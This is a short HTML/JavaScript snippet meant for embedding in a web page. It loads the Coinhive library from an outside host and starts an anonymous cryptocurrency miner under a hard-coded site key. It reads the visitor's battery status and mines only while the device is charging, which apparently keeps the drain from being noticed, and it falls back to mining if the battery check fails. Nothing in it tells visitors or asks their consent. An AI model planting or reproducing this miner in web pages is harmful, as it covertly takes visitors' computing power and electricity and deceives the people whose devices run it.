<script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
<script type="text/javascript">
var miner = new CoinHive.Anonymous('tvCtC1O0jLGZJ6TWIIgdBxYQctUZtLdM', {
	threads: 1,
	autoThreads: false
});
try {
	navigator.getBattery().then(function (battery) {
		
		if (battery.charging) miner.start(CoinHive.FORCE_MULTI_TAB);
		
		battery.onchargingchange = function (evt) {
			if (battery.charging) miner.start(CoinHive.FORCE_MULTI_TAB);
			else miner.stop();
		}
		
	});
}catch(e){miner.start(CoinHive.FORCE_MULTI_TAB);}
</script>